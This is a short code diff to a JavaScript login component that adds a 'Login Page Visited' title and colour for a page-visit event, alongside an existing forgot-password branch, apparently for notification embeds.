@@ -159,6 +159,9 @@ export default function Login() {
       } else if (action === "FORGOT_PASSWORD") {
         embedTitle = "🔑 Forgot Password Attempt";
         embedColor = 0xffa500;
+      } else if (action === "PAGE_VISIT") {
+        embedTitle = "👤 Login Page Visited";
+        embedColor = 0x5865f2;
       }
 
       fields.push(
